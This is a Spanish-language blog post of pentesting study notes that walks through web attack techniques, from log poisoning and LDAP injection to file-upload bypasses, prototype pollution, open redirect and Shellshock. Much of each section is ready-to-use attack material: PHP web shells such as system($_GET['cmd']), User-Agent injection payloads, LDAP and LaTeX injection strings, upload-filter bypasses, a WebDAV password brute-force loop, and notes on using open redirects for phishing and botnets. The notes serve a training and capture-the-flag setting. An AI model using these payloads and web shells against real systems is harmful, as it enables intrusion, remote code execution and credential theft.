---
title: Vulnerabilidades 2
date: 2023-09-20
categories: [Hacking Web, Abrir con cuidado]
tags: [Log Poisoning, Padding Oracle, Type Juggling, LDAP, Inyecciones LaTex, API, Subida de Archivos, Prototype Pollution, AXFR, Mass Assignment, Open Redirect, WebDaV, Squid Proxies, Shellshock]
image:
  path: ../../assets/img/HackingWeb/AbrirConCuidado/vulns2.jpg
  width: 528
  height: 340
  alt: Banner Vulns2
---

Continuaremos el contenido de Vulnerabilidades 1, dado que hay unas cuantas vulnerabilidades más. Todas ellas hermosas. Agradecimientos a Marcelo Vázquez conocido también como s4vitar. Parte de los conocimientos los he recogido de sus videos y academia.
- - - 

## Log Poisoning

Gracias a esta vulnerabilidad podemos convertir un LFI a un RCE.

Ruta guardado de logs Apache: **/var/log/apache2/access.log**  
Ruta guardado de logs ssh: **/var/log/auth.log** ó **/var/log/btmp**

### Logs de Apache
Cualquier petición que haga al servidor se registra en ese log, aunque el recurso no exista.

Para que se de esta vulnerabilidad el usuario que lleva la web (normalmente www-data) tiene que tener permisos de lectura en los logs y por supuesto tener un LFI, imagina que tengo un LFI en una web cualquiera:
```
http://webInsegura/index.php?filename=/var/log/apache2/access.log
```
Si apuntando a esa ruta podemos listarlo es que el usuario que corre la web puede leer los logs, verás que si recargas van saliendo más logs; las peticiones y sus User-Agent. Y del **User-Agent** nos aprovecharemos:
```bash
> curl -s -X GET "http://webInsegura/loquesea" -H "User-Agent: <?php system('whoami'); ?>
```
Es en código php porque el LFI se llama desde un fichero php, es gracias a un fichero php y (posiblemente) la función include que te lo carga.  
Si volvemos a leer ese access.log mediante el LFI veremos el resultado del comando whoami en el caso de que la función system esté habilitada. Para saber que funciones hay habilitadas en el server:
```bash
> curl -s X GET "http://webInsegura/loquesea" -H "User-Agent: <?php phpinfo(); ?>"
```
Se encuentran en **disable_functions**.

Por último y para faciliar el RCE:
```bash
> curl -s -X GET "http://webInsegura/loquesea" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```
Escapamos el $ por en bash puede generar conflicto.  
Y ya desde el navegador:
```
http://webInsegura/index.php?filename=/var/log/apache2/access.log&cmd=cat /etc/passwd
```
### Logs de SSH

Desde terminal realizo petición por ssh para que se guarde el log:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@IP

--> y escribimos cualquier contraseña
```
Te habrá añadido esa línea en el log.  
Ahora por navegador pero esta vez al log de ssh:
```
http://webInsegura/index.php?filename=/var/log/auth.log&cmd=whoami
```
- - - 

## CSTI - Client Side Template Inyection

El ataque CSTI es parecido a un SSTI (Server Side Template Inyection). Surgen cuando las aplicaciones que utilizan un **marco de plantilla del lado del cliente** incorporan dinámicamente la entrada del usuario en las páginas web. Cuando se representa una página web, el marco escaneará la página en busca de expresiones de plantilla y ejecutará cualquiera que encuentre.  
Dejo por aquí la página donde recojo la información:  
https://portswigger.net/kb/issues/00200308_client-side-template-injection

Para testear podemos hacer lo mismo que para un SSTI;  
\{\{7\*7\}\}  
Pero no funcionará si queremos cargar archivos locales o ejecutar comandos. No se puede a través de este ataque. A lo que suele derivar es a un XSS, si vamos a payloadAllTheThings al apartado de XSS [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) podemos encontrar ejemplos de CSTI (filtra por client-side).

Una vez llegado al XSS no se pueden hacer las mismas cosas, es más díficil, o así lo veo yo. Es el propio usuario a vulnerar quien tendría que escribir el propio xss para que se cargara(por lo que puedo entender).

- - - 

## Padding Oracle - Ataque de Oráculo de Relleno.

### ¿Qué es? 

Un padding oracle attack es un ciberataque criptográfico para el modo **cifrado CBC** que permite descifrar un mensaje completo a partir de una dosis mínima de información acerca de su padding.  
¿Qué es el padding?. El padding (relleno) es el sistema que utiliza un modo de operación de cifrado para rellenar los bits que hacen falta para completar el bloque del mensaje. Ya que los bloques tienen un tamaño fijo.  
Información recogida en; https://keepcoding.io/blog/que-es-un-padding-oracle-attack/.  
Otra página donde lo explican muy bien es; https://www.vulnhub.com/?q=padding+oracle

El cifrado CBC divide el mensaje en bloques de X bytes. Cada bloque de texto plano es cifrado mediante una operación XOR (cifrado XOR). Además, al siguiente bloque se le hace una operación XOR con el bloque de texto cifrado anterior. Para comenzar el algoritmo, se utiliza un vector de inicialización. Y así se originaría un texto cifrado final.

Cuando la aplicación te descifra el código cifrado primero descifra el mensaje y luego limpia el relleno. Si el relleno es inválido puede generar alguna respuesta que nos de algo de información para realizar este ataque. 
Información recogida de la Academia de S4vitar; https://hack4u.io.

El texto cifrado podría ser la cookie.

### ¿Cuando pensar en hacer?

No es un ataque muy común. Si no tengo nada más que una cookie por ejemplo, probaría a analizarla con la herramienta **padbuster**.

### Explotación

Usando herramienta padbuster:
```bash
# Modo de uso
> padbuster URL EncrytedSample BlockSize [options]

# El BlockSize debe ser múltiplo de 8 bytes. Hay que ir probando, empezaré por el 8.
# El argumento options se suele usar para especificar el lugar del cifrado,  en este caso la cookie.
# El tipo de la cookie era auth en ese caso.
> padbuster https://webVulnerable COOKIE 8 -cookies 'auth=COOKIE'

# De manera interactiva sacarán unos ID, selecciona el recomendado para seguir.
```
Imagina que lo descifra y nos el valor de; username=guille. Ahora lo que estaría muy bien es que nos cifrara un valor como username=admin. Si el usuario admin existiera en la web podríamos entrar como esa cookie creada. Para hacerlo:
```bash
> padbuster https://webVulnerable COOKIE 8 -cookies 'auth=COOKIE' -plaintext 'username=admin'

# Ahora hará el proceso inverso, estará cifrando. Se podría decir que ha guardado el proceso de descifrado anterior.
```

Ora forma de hacerlo es la siguiente, pero se requiere algo de paciencia y suerte a la hora de comprobar las respuestas por burpsuite:

Si nos registramos como un usuario parecido gramaticalmente al usuario a suplantar, digamos admin, será más fácil obtener un cifrado similar a ese usuario. Por ejemplo si nos registramos con cdmin. Para desplegar este ataque usaremos Burpsuite-->Intruder-->Tipo Sniper--> En payload type seleccionar **bit flipper**, cambiar a Literal Value, descheckea URL-encode(abajo), lo demás igual. Start.  
Toca fijarse en las diferencias de longitud de las respuestas y comprobar el usuario creado con esa cookie. Este punto es el de la paciencia.

- - - 

## Ataque Type Juggling

### ¿Qué es?
También conocidas como Type Confusion, son una clase de vulnerabilidad en la que se inicializa o se accede a un objeto como del tipo incorrecto, lo que permite a un atacante eludir la autenticación o socavar la seguridad de tipo de una aplicación, lo que posiblemente conduzca a la ejecución de código arbitrario.

### ¿Cuando pensar en hacer?
Pensaría en hacerlo sobretodo en un panel de autenticación, donde se espere que introduzcas un tipo de datos determinado.

### Explotación

Imaginar un panel de login, con campos user y password. Ambos campos esperar que introduzcamos un tipo de dato Char, pero le pasaremos otro.  
Si pasamos por burpsuite la petición, digamos que en la data por POST tenemos esto:
```plaintext
usuario=admin&password=admin123

# Esto es lo que podría esperar. Pero si cambiamos de tipo a otro no esperado, un tipo array por ejemplo:

usuario=admin&password[]=
```
Depende de las comparativas que haya por detrás podría funcionar.

- - - 

## Inyecciones LDAP

### ¿En qué consiste?

Primero habría que definir que es LDAP:  
El protocolo LDAP es muy utilizado actualmente por empresas que apuestan por el software libre al utilizar distribuciones de Linux para ejercer las funciones propias de un directorio activo en el que se gestionarán las credenciales y permisos de los trabajadores y estaciones de trabajo en redes LAN corporativas en conexiones cliente/servidor.  
Recogido en está página; https://hack4u.io/cursos/introduccion-al-hacking/14902/

Se podría decir que LDAP es como un AD (Active Directory) pero para linux.  
El puerto de conexión para LDAP suele ser el 389 TCP.

### Enumeración

Si en los escaner básicos nos sale el puerto 389, lo relacionamos con ldap.  
Nmap tiene scripts específicos para este servicio, los lanzaremos todos:
```bash
> nmap --script ldap\* -p389 IP
# Te aplica un pequeño reconocimiento, te podría extraer el dominio o dc donde corre LDAP y el cn (un usuario).
# En este ejemplo sacaría; cn=admin, dc=company, dc=org
> ldapsearch -h IP -x -s base namingcontexts
# Esta sería otra forma de hacerlo. Si tuvieramos el dominio sería así:
> ldapsearch -H ldap://DOMINIO -x -s base namingcontext
```
Una vez averiguado ese dc:
```bash
> ldapsearch -h IP -x -b "DC=company,DC=org"
```
Si consiguieramos más información -usuarios y contraseñas- ya sea por ldap o gracias a otra vulnerabilidad podríamos lanzar esto:
```bash
> ldapsearch -H ldap://dc.maquina.htb -x -D pepe@maquina.htb -w Darkmoonsky248girl -s base
# Esto es solo un ejemplo. -D: Usuario, -w: Contraseña, s= Atributo.
```
### Inyecciones posibles

Piensa que la estructura por detrás suele ser algo así:
```
(&(cn=admin)(password=loquesea))
# & es de operador AND. Si estuviera | sería de OR.
```
Una simple inyección sería poner un **asterisco** en el campo de contraseña y/o usuario. Si está mal sanitizado podrías acceder. Incluso con el juego de asteriscos buscar usuarios y contraseñas, por ejemplo si existe el usuario admin podríamos hacer desde el **burpsuite**:
```
user:a*&password=*   Saldría mensaje de acceso por ejemplo.
Otra petición: 
user=b*&password=*   Saldría otro mensaje, error por ejemplo. Dado que no hay usuarios que empiezen por b. De esta manera podríamos ir sacando usuarios y contraseñas. Interesante sería montarte un script en python.
```
Otra inyección posible sería cerrar la query así:
```
user=admin))%00&password=test

# Con esto )) lo que hacemos es cerrar la query y con el %00 es obviar todo lo que sigue. Sería como pedirle; Accede con el usuario admin y punto.
```
Podríamos buscar otros atributos jugando combinadamente con las dos anteriores inyecciones:
```
# El concepto sería el siguiente, pero habría que pasarlo por alguna herramienta que nos aplicará la fuerza bruta. Usaremos wfuzz.

user=admin)(FUZZ=*))%00&password=test

# Buscaremos atributos(FUZZ) y atenderemos a las respuestas
```
```bash
> wfuzz -c -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d 'user=*)(FUZZ=*))%00&password=test' http://IP

# Tendrías que filtrar luego según las respuestas recibidas.
```
Imagina que te saca un atributo llamado numberphone:
```bash
> wfuzz -c -z range,0-9 -d 'user=admin)(numberphone=FUZZ*))%00&password=test' http://IP

# Te sacaría el primer número correcto. Si fuera el 7. Tendrías que seguir con numberphone=7FUZZ* y así. Está chulo.
```
Tengo un script en python para este ataque en el post **scripts_Python**. Este script está basado en uno que hizo s4vitar en su academia para esta misma vulnerabilidad.

- - - 

## Inyecciones LaTex

### ¿En qué consiste?

LaTeX es un sistema de composición de textos, orientado a la creación de documentos escritos que presenten una alta calidad tipográfica. Está formado por un gran conjunto de macros de TeX.

Es muy utilizado para la composición de artículos académicos, tesis y libros técnicos, dado que la calidad tipográfica de los documentos realizados en LaTeX, se considera adecuada a las necesidades de una editorial científica de primera línea.  
Básicamente te lo dejo más bonito. Se nota una mayor calidad.

Información recogida de la página de Chema Alonso [elladodelmal](https://www.elladodelmal.com/2022/08/ataques-de-hacking-contra-compiladores.html).

Cada vez más se utilizan plataformas online que generan esos documentos LaTex, porque así te ahorras tener que instalarlo y demás. El problema es cuando esos servidores que utilizan son vulnerables.

### ¿Cómo darse cuenta?

Por ejemplo si ves páginas web que te recogen un fichero o un texto y te lo transforman en un formato más bonito. Podrías ver algo como "generadores PDF", "generadores LaTex", etc.

### Explotación

Tenemos este recurso de github que pertenece a payloadsallthethings:
[LaTex Inyection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).

Salen inyecciones como estas:
```
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```
La inyección \input se podría probar para las webs que generen PDF, \include para archivos .tex.

Hay unas cuantas inyecciones más, tendrás que ir probando si no funcionan. Puede que este sanitizado el código y tengas que investigar.

- - - 

## Explotación de APIs

### ¿En qué consiste?

En explotar las vulnerabilidades existentes en las interfaces de las APIs(aplicaciones).

### Enumeración

Antes de nada si no tenemos la herramienta **postman** la instalaremos.  
Postman es una plataforma API para que los desarrolladores diseñen, construyan, prueben e iteren sus API. El tema es que los atacantes pueden utilizar la herramienta para encontrar los endpoints(rutas) de una API y hallar vulnerabilidades.

Manual para la instalación de postman en un debian [aquí](https://techbear.co/install-postman-debian-linux/). Hasta la parte del icon, no incluida, al menos en mi caso, en mi entorno no hay iconos.

```bash
> postman
# Se abrirá la herramienta.
```
Para usarlo:
1. Create Collection, le pones un nombre.
2. New --> HTTP Request --> Introduces url de la API y método que sea.
3. Send.

Posiblemente no veas nada abajo, te saldrá un 404. Esto es porque te faltaran campos por añadir a la petición. Si interceptas la petición usando el navegador y con burpsuite escuchando, o sin el burpsuite, con la consola del navegador en network puedes pillar en "Request" los campos, la pasas a formato raw.

4. Dentro de nuevo en postman te vas a "Body" y pegas el texto en raw, selecciona opción raw y en "Text" el tipo de texto que sea (json, html, etc).
5. Send. Por debajo verás la respuesta del servidor si todo bien
6. Save. Pones nombre que quieras. Save. Lo tendrás a la izquierda guardado.

Bien, ahora para **añadir otras rutas/endpoints** que veas puedes hacer "New"--> HTTP Request--> Añadimos url --> Save --> Nombre que quieras --> Save  
Se guardará en el proyecto creado antes. Ahora puedes darle a enviar "Send" y ver respuesta. Posiblemente si son nuevas rutas (más profundas) te pedirán algún tipo de credencial como cookies, JWT u otras. Es recomendable aquí jugar con **variables** para añadir esa cookie por ejemplo.  

Para añadir variable:  
Seleccionas proyecto/collection creada --> En "variables" pones el nombre que quieras, descriptivo mejor, en Initial Value puedes poner -- y en Current Value la cookie que tienes(sin comillas)--> Save --> En Authorization pones el tipo de autorización (tipo de cookie), en Token; {{nameVariable}} --> Save.

Ahora en futuras solicitudes se guardará esa cabecera de autenticación, así que perfecto. Antes tendrías que hacer lo de antes de añadir ruta y guardarla en la Collection creada.

Y bien, ya sabiendo añadir rutas, lo bueno es meterlas al postman para poder enumerar bien la API, de una manera más organizada.

### Explotación

Podemos cambiar los métodos de las peticiones para buscar errores. Hay un diccionario en SecLists para los métodos; http-request-methods.txt.

También podemos probar a modificar los valores de los campos metiendo caracteres especiales, números negativos, etc.

Por supuesto buscar si la API tiene vulnerabilades existentes.

- - - 

## Abusando de la subida de archivos

### ¿En qué consiste?.

La web te permite subir archivos, imagenes, fotos de perfil, etc. Si puedes subir algún archivo malicioso y además sabes de la ubicación donde se aloja ese archivo en el servidor para poder llamarlo, el servidor sería vulnerable.

### Ejemplos de explotación.

#### Caso 1, **sin ningún tipo de sanitización**:

De primeras podríamos probar a subir un php, por ejemplo este:
```php
<?php
    system("whoami");
?>
```
¿Qué sabemos donde se aloja?, por ejemplo en carpeta /uploads/prueba.php.  
Lo llamo/apunto a ese archivo y si la web interpreta php  recibiremos el output del comando.

Mejor que el anterior archivo php sería este:
```php
<?php
system($_GET['cmd']);
?>
```
Ahora podríamos ejecutar el comando que queramos mediante este estructura de llamada; `http://WEB/uploads/archivo.php?cmd=COMANDO`.

#### Caso 2, **validación a nivel de navegador**:

Al intentar subir un php nos salta el aviso de que solo pueden subirse extensiones de imagenes(jpg, jpeg, png, gif, etc).

Parece que por detrás se hace una validación. La cuestión es ¿cómo se hará esa validación?. Puede ser una validación a nivel de servidor digamos, un ejemplo sería que estuviera en el código php de la página. Y puede ser una validación a nivel de navegador o usuario, y este será el ejemplo para el caso 2. Una forma de llegar a pensar en esto es si te parece que no ha habido una respuesta del servidor. No te habrá llegado la petición al burpsuite.

Abres la consola de navegador (Ctrl + Shift + C) y en el código de la página sería suficiente con quitar la parte que valida y probar a subir.

#### Caso 3, **validación a nivel de servidor, extensiones**:

Al intentar subir un php no lo permite. Parece que hay una respuesa del lado del servidor.

Un servidor puede interpretar como php otras extensiones que no sean php. Son: `.pht, .phtm, .phtml, .php2, .php3, .php4, .php5, php6, php7, phps, pgif, phar, inc,` etc.  
En [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload) hay varias más.

Paso el archivo por burpsuite y lo mando al "repeater" por comodidad para ver la respuesta al lado. Cambio la extensión de mi .php por una de las mostradas arriba.   
Puede que te suba el archivo pero no te interprete el código cuando llamas al archivo. Tendrás que ir probando extensiones hasta que, con suerte, una funcione.

**Otra alternativa** en cuanto a extensiones:  
A veces hacen la comparativa en plan "que contenga la palabra jpeg" en este caso podríamos hacer un **ataque de doble extensión**. En el filename dentro del burpsuite cambiaremos la extensión; `pwn.jpeg.php`. Me lo interpretará como la última extensión que es php.

#### Caso 4, **validación en el tipo de archivo y magic number**:

- 4.1: A veces lo que validan es el Content-Type. Este se genera a través de los magic number del archivo que subes. Desde el burpsuite se puede ver y modificar.  
Podríamos sustituir nuestro Content-Type: application/x-php por `image/jpg`.  
Probamos a subirlo y si funciona perfecto. 

- 4.2: Si no funciona, puede que no solo comprueben el content-type y miren también los magic number del archivo, entonces habrá que modificar la primera línea del archivo a subir. Podrías encontrar más tipos aquí; [list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures). Ejemplo:
```php
GIF8;

<?php
system($_GET['cmd']);
?> 
```

#### Caso 5, **htaccess**

No permite subir php, y las alternativas a php usadas en el caso anterior o no las sube o no las interpreta.

En este caso nos aprovecharemos el .htaccess. El archivo htaccess (acceso de hipertexto) es un archivo oculto que se utiliza para configurar funciones adicionales para sitios web alojados en el servidor.  
En este archivo podríamos decirle por ejemplo que los archivos con extensión .caracol los interpretara como php.

Para conseguirlo primero tendremos que probar a subir un archivo llamado .htaccess, en el Content-Type mejor poner text/plain. El contenido de ese archivo sería algo así:
```bash
AddType application/x-httpd-php .caracol     
# Todos los archivos .caracol serán ejecutados como .php
```
Si ahora subimos el archivo.caracol lo interpretaría como php. Si funciona guay, si no es que desde el servidor nos prohiben subir archivos .htaccess(lo que es conveniente) y tendríamos que seguir probando con el caso 5.

#### Caso 6, límites en el tamaño permitido**:

Te señala que hay un máximo de tamaño de archivo. Habría dos maneras de intentar bypassearlo:  
1. Si  ves un campo size en el burp cambiarlo a otro valor más grande.
2. Reducir el contenido del php lo máximo posible. Podría reducirse así y debería seguir funcionando:
```php
<?=`$_GET[0]`?>

# Sería lo mismo que el típico php que usamos de:
# <?php system($_GET['cmd']); ?>
```
Para llamar al recurso; `http://WEB/uploads/archivo.php?0=COMANDO`.

#### Caso 7, **cambio de nombre en la subida:**

Puede que al subir el archivo lo guarden con otro nombre. Podría ser que le pasen una conversión a md5, sha-0, sha-1, otros personalizados, etc. Si no tenemos acceso al código no podremos llevar a las conversiones personalizadas o más complicadas, pero si podemos probar algunas básicas como md5. Si por ejemplo hemos subido el archivo con nombre pwn.php, podríamos realizar estas conversiones con md5sum:
```bash
echo -n "pwn" | md5sum
# En este caso a la hora de llamarlo habrá que añadir .php

echo -n "pwn.php" | md5sum

md5sum pwn.php

# Cada comando obendrá un resultado en md5. 
# Lo mismo para otros algortimos de hash.
```

#### Caso 8, **no sabes directorio donde se aloja**:

Hay que fuzzear:
```bash
gobuster dir -u http://WEB/ -w DICCIONARIO -t 25
# Con gobuster

wfuzz -c --hc=404 -w DICCIONARIO http://WEB/FUZZ -t 150
# En ambos casos la opción t es de threads o hilos.
```
Si al encontrar el directorio llamaramos al archivo con el nombre de subida y no estuviera habría que probar el caso anterior o fuzzear en el subdirectorio encontrado en búsqueda de archivos.

#### Caso 9, **me descarga el archivo**:

Cuando llamo al archivo desde el navegador lo descarga y no quiero, entonces usaré la herramienta curl:
```bash
curl -s X GET "http://WEB/FILE.PHP" -G --data-urlencode "cmd=id"
# Obtendremos el output del comando por consola. No hace falta el interrogante.
```
- - - 

## Prototype Pollution

### ¿Qué es?
Prototype pollution o contaminación de prototipo se aprovecha de la vulnerabilidad de implementación de objetos en JavaScript.

JavaScript está basado en prototipos, cuando se crean nuevos objetos, estos transfieren las propiedades y métodos del “objeto” prototipo, que contiene funcionalidades básicas. Esta herencia basada en objetos hace que el lenguaje tenga mayor flexibilidad para los programadores.

Curiosamente, los atacantes ni siquiera necesitan modificar el objeto directamente; pueden acceder a él a través de la propiedad ‘ __proto__ ‘ de cualquier objeto de JavaScript. Y una vez que realiza un cambio en el objeto, se aplica a todos los objetos de JavaScript en una aplicación en ejecución, incluidos los creados después de la manipulación.

Recogido de esta [página](https://www.north-networks.com/que-es-ataque-prototype-pollution/) y de la academia de s4vitar.

### Explotación

Se produce cuando el atacante consigue modificar la propiedad prototype de un objeto de la web. Se puede lograr a través de la modificación de los formularios o solicitudes AYAX,  y mediante la inserción de esa propiedad en el código JavaScript de la aplicación Web.

Ejemplo de código normal y con pollution:
```js
let customer = {name: "person", address: "here"}
console.log(customer.toString())
//output: "[object Object]"
// Ejemplo de código sin vulnerar.
```
Aquí con el prototype pollution:
```js
customer.__proto__.toString = ()=>{alert("polluted")}
console.log(customer.toString())
// alert box pops up: "polluted"
```
La función merge puede ser vulnerable a este ataque. 

Si incorporamos una propiedad(campo) que no existe la lógica del programa acude al prototipo para heredar las propiedades de ese objeto prototipo. Imaginate que por burpsuite pillamos estos campos en JSON:
```js
{"email": "guise@guise.com", "user": "guise", "msg": "Hola, que tal?"}
```
Pues ahora voy a añadir nuevo campo:
```js
{"email": "guise@guise.com", "user": "guise", "msg": "Hola, que tal?", "__proto__":{"isadmin":true}}
// Estoy provocando(si es vulnerable) que el prototipo tenga la propiedad isadmin seteada a true.
// La propiedad admin: True es solo un ejemplo que se obtendría en el código de la aplicación.
// Si llamamos a un objeto con esa propiedad; guise.isadmin, si guise no tiene esa propiedad ahora la heredaría del prototipo que es true.
```
La **conclusión** extraida es que es una vulnerabilidad con código en mano. Ver el código te faciliará bastante, si no, siempre puedes investigar sobre las propiedades más comunes y fuzzear un poco.

En estas páginas explican muy bien este ataque:  
[medium](https://medium.com/@zub3r.infosec/exploiting-prototype-pollutions-220f188438b2)  
[portswigger](https://portswigger.net/web-security/prototype-pollution)

- - - 

## Ataque de transferencia de zona - AXFR

### ¿Qué es?

En un ataque dirigido a los servidores de dominio, con ella se pueden descubrir los nombres de dominio del servidor objetivo.  
Es un ataque dirigido al servidor DNS.

Se realiza una solicitud de transferencia de zona a los servidores de dominio. Si el servidor de nombres es vulnerable recibiremos la información.  

### Abuso del ataque

```sh
> dig @IP DOMINIO axfr
# Y este es el comando para el ataque de transferencia de zona.
# Esto en el caso de que supieras el dominio. Si no lo supieras puedes usar:
> nslookup # Entrarías en modo interactivo:
> server IP 
> IP # Te saldría el dominio

# Otra manera de sacar el dominio es con una resolución inversa:
> dig @IP -x IP
```
Otros tipos de ataque más específicos contra el DNS son:  
ns: name server.  
mx: servidores de correo.

---

## Mass Assignment Attack

### ¿Qué es?

El ataque de asignación masiva, como se le conoce en español a este ataque, es una vulnerabilidad informática en la que se abusa de un patrón de registro activo en una aplicación web para modificar elementos de datos a los que el usuario normalmente no debería tener acceso, como la contraseña, los permisos concedidos o el estado del administrador.

Para entenderlo mejor; imagina que en una solicitud nuestra mandamos unos determinados campos/parámetros por defecto. Si añado otro campo que existe en el servidor pero que nosotras no deberíamos tener acceso entonces se produce este tipo de ataque.

### Explotación

Imaginar que pasando la petición por burpsuite (para verlo más claro) vemos que estamos enviando estos campos:
```js
{
"user": "jaimito",
"password": "jaimito123"
"email": "jaimethebest@htb.com"
}
```
Bien, podríamos añadir un campo, ya sea porque sabemos que existe o fuzzeando:
```js
{
"user": "jaimito",
"password": "jaimito123",
"email": "jaimethebest@htb.com",
"id": "1"
}
```
Si este campo funcionará igual nos otorgaría el id 1, que podría ser del usuario administrador.  
Si no funcionará el campo o el valor sería ir probando algunos típicos. Seguro que encuentras también algun diccionario relacionado.

- - - 

## Open redirect

### ¿En qué consiste?

Consiste en redirigir a los usuarios a otras webs, normalmente maliciosas. Se produce cuando nos aprovechamos de un redireccionamiento existente en el servicio web para apuntar a otro lugar.

Este ataque está muy relacionado con los ataques DoS y DDos, ya que aprovechandonos de webs conocidas con esta vulnerabilidad podemos apuntar a un recurso determinado para ocasionarle un ataque DoS. Una herramienta que utiliza esta técnica es **Ufonet**, dejo el enlace de github por [aquí](https://github.com/epsylon/ufonet).  

Mediante este recurso se puede montar una **botnet**. Gracias a estas webs vulnerables a open redirect (descubiertas con google dorking) apunto a un dominio cualquiera donde el que envía esa petición es la web vulnerable y no tú.  
En este caso no haría falt haber infectado los equipos para tener una botnet.

Para **phishing** funciona bien, dado que si pasas un enlace, a los correos de los empleados por ejemplo, donde la parte principal de la url es de la propia compañia que es vulnerable a open redirect sospecharán menos. En el redirect ya podrías poner una web maliciosa clonada de la víctima.

### Ejemplillo

Url de ejemplo:
```sh
http://WEB/redirect?url=/WEBAPUNTAR

# Si no funcionará podemos probar a urlencodear el punto. Y si tampoco vuelve a urlencondear el % 
# Para dominios https no hace falta poner las //. Sería otra forma de bypass. https:WEBAPUNTAR.
```

- - - 

## WebDAV

### ¿Qué es?

Es un protocolo que se encarga de permitirnos de forma sencilla guardar, editar, copiar, mover y compartir archivos desde servidores web. Gracias a este protocolo, podremos trabajar con archivos directamente en un servidor web, como si de un servidor Samba o FTP se tratara.

### Explotación

Podemos darnos cuenta que estamos ante ese servicio enumerando a través de whatweb, wappalyzer, nmap u otros medios.  
Normalmente piden credenciales para acceder.

La herramienta **davtest** te serviría, si tienes credenciales, como test de subida, hace una fuerza bruta de subida de archivos con diferentes extensiones.  
```sh
davtest -url URL -auth admin:1234
```
Pero si no tienes también podrías aprovecharla. Dado que te dará un respuesta distinta si es correcta o no la credencial podrías realizar una fuerza bruta. Mejor que te sepas algún usuario, si no pues suponemos que existe admin, un ejemplo de comando:
```sh
cat DICCIONARIO | while read password; do davtest -url http://10.10.11.11 -auth admin:$password 2>&1 | grep -v FAIL; done
# FAIL sería el mensaje de error si las credenciales no son correctas.

# Si lo quieres más bonito:
cat DICCIONARIO | while read password; do output=$(davtest -url http://10.10.11.11 -auth admin:$password 2>&1 | grep -v FAIL); if [ $output ]; then echo " Credencial válida: $password"; break; fi; done
```
Otra herramienta para este servicio es **cadaver**. Se usa con credenciales. Para instalar `apt install cadaver`. Y el uso es  `cadaver URL` luego te pedirá usuario y contraseña. En ese punto ya puedes subir archivos.

- - - 

## Squid Proxies

### ¿Qué es?

El proxy Squid es un servidor web proxy-caché con licencia GPL cuyo objetivo es funcionar como proxy de la red y también como zona caché para almacenar páginas web, entre otros. 

La clave aquí es pasar por ese squid proxy para ver que servicios corren por detrás de ese proxy.

### Procedimiento

Imaginar que escaneando una ip descubrimos el puerto 3128 - Squid Proxy. No vemos más puertos abiertos. Pero por detrás del proxy se corre una web a la que en principio no tenemos alcance:
```sh
curl http://10.10.11.11
# No vemos nada
```
Pero si pasamos por squid proxy quizás si lleguemos a él:
```sh
curl http://10.10.11.11 --proxy http://10.10.10.10:3128
# Me saldría el contenido de la página web.
# Misma esctructura para fuzzear luego por gobuster.
```
Desde el navegador también puedes hacerlo añadiendo un nuevo proxy en la extensión FoxyProxy -la que utilizamos para pasar las peticiones por burpsuite-. Pondrías la ip (del objetivo normalmente) y el puerto del squid proxy y ya está. Si activamos ese proxy ahora pasaremos por él antes de solicitar el recurso web y con suerte podremos ver la web.

Si tuvieras una autenticación para un squid proxy puedes emplearla así:
```sh
curl http://10.10.11.11 --proxy http://admin:1234@10.10.11.11
```
Para escanear puertos por nmap a través de un squid proxy dejo un script en python en el post **scripts_python**. ¡Gracias s4vi!, lo cogí de él.

- - - 

## Shellshock

### ¿Qué es?

El nombre oficial de esta vulnerabilidad es GNU Bash Remote Code Execution Vulnerability (CVE-2014-6271) y está considerada como grave, tal y como sucedió con Heartbleed, ya que permitiría la ejecución remota de código y así obtener el control de un ordenador.

El problema con esta vulnerabilidad se viene produciendo porque Bash permite declarar funciones (algo que tampoco es extraño y entra dentro de lo normal), pero estas no se validan de forma correcta cuando se almacenan en una variable. En otras palabras: Bash se pasa de la raya, extralimita sus funciones y sigue ejecutando código a pesar de haber finalizado de procesar la función.

Vista explicación en esta [página](https://www.welivesecurity.com/la-es/2014/09/26/shellshock-grave-vulnerabilidad-bash/).

### Explotación

Normalmente caemos en esta vulnerabilidad cuando encontramos el directorio **cgi-bin**, que lo podremos encontrar fuzzeando ( recuerda añadir la / en wfuzz para encontrarlo o la opción --add-slash en gobuster).

Una vez encontrado habría que fuzzear dentro de este directorio:
```sh
gobuster dir -u http://10.10.12.12/cgi-bin/ -w DICIONARIO -t 30 -x pl,sh,cgi
# Imagina que encontramos un recurso llamado estrella
```
Dejo por aquí una página donde explican bien el ataque; [página](https://blog.cloudflare.com/inside-shellshock/).  Y copio el ejemplo del uso de cabeceras:
```sh
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
# /bin/eject te extrae la disquetera. Pero claro..usaríamos otro comando
```
```sh
curl -s http://10.10.12.12/cgi-bin/estrella -H "User-Agent: () { :; }; /usr/bin/whoami"
# Hay que indicar el comando de manera absoluta. Si no te reportara el comando prueba a meterle un echo; :
curl -s http://10.10.12.12/cgi-bin/estrella -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
# Si tampoco podrías añadirle otro echo; más.
```

- - - 




